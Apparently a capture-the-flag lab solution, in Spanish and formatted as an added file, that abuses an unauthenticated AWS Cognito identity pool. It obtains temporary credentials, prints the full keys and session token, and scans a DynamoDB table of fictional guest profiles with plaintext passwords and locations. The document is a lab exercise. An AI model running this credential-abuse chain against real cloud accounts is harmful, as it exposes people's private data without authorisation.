@@ -1,0 +1,164 @@
+Paso 1: aws cognito-identity get-id \
+  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
+  --region us-east-1
+
+
+Paso 2: aws cognito-identity get-credentials-for-identity \
+  --identity-id "us-east-1:4d571309-b080-c477-6644-b286a2182c0c" \
+  --region us-east-1
+
+(nos devuelve esto:)
+
+{
+    "IdentityId": "us-east-1:4d571309-b080-c477-6644-b286a2182c0c",
+    "Credentials": {
+        "AccessKeyId": "ASIAU2VYTBGYPBYGEN35",
+        "SecretKey": "Sqd5vFmJSc89+5+9PZYU6aJ987eHu2s7sCGKMru7",
+        "SessionToken": "IQoJb3JpZ2luX2VjEMr//////////wEaCXVzLWVhc3QtMSJIMEYCIQDdLL2eLvuesXshQZIChXmI9GpFtyxhslaHZqGQzuCqdwIhANeZKQWtyHk1hD7R3NEed/Vm3OsZutMgL74g2pBa/lbyKrYFCJP//////////wEQABoMMzMyMTczMzQ3MjQ4IgwwiLLc8fwkV2DkVKAqigWDZfDBqoJTFN0a6wT9aibx4+DlVxioHq28w5t6MfyFpV7uQIHxlyA0ZPDt9AYohOotxTzzZCa4Jy56RLo8vtZcUB0YcS7Jz51534w6OGFoiN3ISaSsI8miH0us16Q+f7YVnLiNe41Y6kxLZBCmBZ6Cj42wndPn+HJA5nFNevXuGmhKFDkyuo44GyrwJLpanvHgEy5WxGrhX3CF/9dCIvli1u2s/SfEAyffNFKeTEN930TA1JPTbGb0i4qfqZm/I61MQFL8Ihg8/8lmrv5eS43czCiapnXGZIpsZv2dR2LH8Hq58Fsg1ldXi0iHNBwnwqffUOEVVi/3cOJTL2LgE5v23HCseZaD5agoVYo8irYy8+pXfEr4rA6TyWvK4ORs6U5Z7wtKNd/FRN0QK/3KZWign1L4tLkHrIEhCnik8S0Cpi6bIfjraJrn3jSit4KDHmDL8nDTxqsRLBG+jr97kQFKVE99YQFY4DUlEM02nnLrJY0AKtmVu+hdo/FbZfy9IkL6IeDDzKv0RSmlE9oqBTAQEGxpZS7uRmpY2vXi3rCIoVgNWuJ97M2VvYF45zuQ6zANDfrB79Lxrxm6oIjwsRPkdFwKGXKjQBTc5sHLd2LhCxwF8cuHhorIp4Dt6y4rr3DV7CGIXdJeTJMW1SjpRES5UTW8P8AeXR1fxtsVTjO8hthpGaV3WAZYr9spT4S0+EEOfLdd+PW5pZV4G4PppxaWzb0l4/qGVcuBVz9zzIwrAPzcN1ZdhoffqAJdQKGe281btPJEQmB5mSatOaP/r67EcjNJ2XEV/jNgK3656v2x32ApZFBdFTrOnpXYNBrikf+pjZrOaDYN+aE3Zb/g6JvdS60Jn021K8uZWTDXgZ3UBjreAgOoTyJ0/14nZD6xjCIuNeJLJAqMMfucZc7AW1KutVSEQ6i6NMgRB66+5N4+sXOcNMs84tlTpjTGvNgjC4ozCH3HaWV2IknMs39i8r7b/wkMKAyKgp6PLpVvQQxDvAHBke3vvZiUQtqNpNO0ZxRcEjQtUm7TFmtBQoO+yqA/77+NXpRqhagvllHSmWDyPfm+PCLom9rkvSWdAUujK3etX+nprStQ1N1N5kyTSFHaN32psoMZACNwoWzw/xHnzQiFe2v+EcBkEBZVklLCUn36pFPGfl/f7I4+PlZmEf9avBhQOnyDfWsV1A5HwIml6BwBeMYWPYYtPcQQ9o0GGGSyj3lsrV4bwkrOFeHw0xwzLAZtUsQTc9kbdPlfjIRpSm1qebjHo7FuwLlE3l80aslVqsirRVg2w0DjSyhIyPElgiySkoeRADeFrzx8HKIJVa7f0CyiZZ9SLMQL1O4LxEFb",
+        "Expiration": "2026-08-20T15:00:55-04:00"
+    }
+}
+
+
+Paso 3: aws configure set aws_access_key_id "ASIAU2VYTBGYPBYGEN35" --profile temp
+
+aws configure set aws_secret_access_key "Sqd5vFmJSc89+5+9PZYU6aJ987eHu2s7sCGKMru7" --profile temp
+
+aws configure set aws_session_token 'IQoJb3JpZ2luX2VjEMr//////////wEaCXVzLWVhc3QtMSJIMEYCIQDdLL2eLvuesXshQZIChXmI9GpFtyxhslaHZqGQzuCqdwIhANeZKQWtyHk1hD7R3NEed/Vm3OsZutMgL74g2pBa/lbyKrYFCJP//////////wEQABoMMzMyMTczMzQ3MjQ4IgwwiLLc8fwkV2DkVKAqigWDZfDBqoJTFN0a6wT9aibx4+DlVxioHq28w5t6MfyFpV7uQIHxlyA0ZPDt9AYohOotxTzzZCa4Jy56RLo8vtZcUB0YcS7Jz51534w6OGFoiN3ISaSsI8miH0us16Q+f7YVnLiNe41Y6kxLZBCmBZ6Cj42wndPn+HJA5nFNevXuGmhKFDkyuo44GyrwJLpanvHgEy5WxGrhX3CF/9dCIvli1u2s/SfEAyffNFKeTEN930TA1JPTbGb0i4qfqZm/I61MQFL8Ihg8/8lmrv5eS43czCiapnXGZIpsZv2dR2LH8Hq58Fsg1ldXi0iHNBwnwqffUOEVVi/3cOJTL2LgE5v23HCseZaD5agoVYo8irYy8+pXfEr4rA6TyWvK4ORs6U5Z7wtKNd/FRN0QK/3KZWign1L4tLkHrIEhCnik8S0Cpi6bIfjraJrn3jSit4KDHmDL8nDTxqsRLBG+jr97kQFKVE99YQFY4DUlEM02nnLrJY0AKtmVu+hdo/FbZfy9IkL6IeDDzKv0RSmlE9oqBTAQEGxpZS7uRmpY2vXi3rCIoVgNWuJ97M2VvYF45zuQ6zANDfrB79Lxrxm6oIjwsRPkdFwKGXKjQBTc5sHLd2LhCxwF8cuHhorIp4Dt6y4rr3DV7CGIXdJeTJMW1SjpRES5UTW8P8AeXR1fxtsVTjO8hthpGaV3WAZYr9spT4S0+EEOfLdd+PW5pZV4G4PppxaWzb0l4/qGVcuBVz9zzIwrAPzcN1ZdhoffqAJdQKGe281btPJEQmB5mSatOaP/r67EcjNJ2XEV/jNgK3656v2x32ApZFBdFTrOnpXYNBrikf+pjZrOaDYN+aE3Zb/g6JvdS60Jn021K8uZWTDXgZ3UBjreAgOoTyJ0/14nZD6xjCIuNeJLJAqMMfucZc7AW1KutVSEQ6i6NMgRB66+5N4+sXOcNMs84tlTpjTGvNgjC4ozCH3HaWV2IknMs39i8r7b/wkMKAyKgp6PLpVvQQxDvAHBke3vvZiUQtqNpNO0ZxRcEjQtUm7TFmtBQoO+yqA/77+NXpRqhagvllHSmWDyPfm+PCLom9rkvSWdAUujK3etX+nprStQ1N1N5kyTSFHaN32psoMZACNwoWzw/xHnzQiFe2v+EcBkEBZVklLCUn36pFPGfl/f7I4+PlZmEf9avBhQOnyDfWsV1A5HwIml6BwBeMYWPYYtPcQQ9o0GGGSyj3lsrV4bwkrOFeHw0xwzLAZtUsQTc9kbdPlfjIRpSm1qebjHo7FuwLlE3l80aslVqsirRVg2w0DjSyhIyPElgiySkoeRADeFrzx8HKIJVa7f0CyiZZ9SLMQL1O4LxEFb' --profile temp
+
+aws configure set region us-east-1 --profile temp
+
+
+Paso 4: aws dynamodb scan --table-name "complimentary-GuestWellnessProfiles" --profile temp
+
+
+(nos devuelve esto:)
+
+
+{
+    "Items": [
+        {
+            "password": {
+                "S": "digitaldetox2026"
+            },
+            "location": {
+                "S": "25.2055,55.2733"
+            },
+            "notes": {
+                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."
+            },
+            "guest_id": {
+                "S": "guest-vibe"
+            },
+            "email": {
+                "S": "vibe@hackerholidays.thm"
+            },
+            "phone": {
+                "S": "+1-555-0193"
+            },
+            "name": {
+                "S": "Vibe (Move Fast & Break Things)"
+            }
+        },
+        {
+            "password": {
+                "S": "sunkissed88"
+            },
+            "location": {
+                "S": "25.2048,55.2708"
+            },
+            "notes": {
+                "S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."
+            },
+            "guest_id": {
+                "S": "guest-lambo"
+            },
+            "email": {
+                "S": "lambo@hackerholidays.thm"
+            },
+            "phone": {
+                "S": "+1-555-0142"
+            },
+            "name": {
+                "S": "Lambo (@0xMia)"
+            }
+        },
+        {
+            "password": {
+                "S": "escalation_only"
+            },
+            "location": {
+                "S": "25.2048,55.2708"
+            },
+            "notes": {
+                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
+            },
+            "guest_id": {
+                "S": "guest-vip-042"
+            },
+            "email": {
+                "S": "vip042@hackerholidays.thm"
+            },
+            "phone": {
+                "S": "+1-555-0100"
+            },
+            "name": {
+                "S": "Guest VIP-042"
+            }
+        },
+        {
+            "password": {
+                "S": "haveyoutriedrestarting"
+            },
+            "location": {
+                "S": "25.2030,55.2690"
+            },
+            "notes": {
+                "S": "Filed three tickets about this app. All closed as \"resolved\" by VERA."
+            },
+            "guest_id": {
+                "S": "guest-patch"
+            },
+            "email": {
+                "S": "patch@hackerholidays.thm"
+            },
+            "phone": {
+                "S": "+1-555-0159"
+            },
+            "name": {
+                "S": "Patch (Have You Tried Turning It Off)"
+            }
+        },
+        {
+            "password": {
+                "S": "notmykeys1"
+            },
+            "location": {
+                "S": "25.2011,55.2701"
+            },
+            "notes": {
+                "S": "Checks his portfolio 34 times a day. Brought three devices for \"redundancy.\""
+            },
+            "guest_id": {
+                "S": "guest-ponzi"
+            },
+            "email": {
+                "S": "ponzi@hackerholidays.thm"
+            },
+            "phone": {
+                "S": "+1-555-0187"
+            },
+            "name": {
+                "S": "Ponzi (Satoshi_Probably)"
+            }
+        }
+    ],
+    "Count": 5,
+    "ScannedCount": 5,
+    "ConsumedCapacity": null
+}
+(END)
+
+
+
+ 
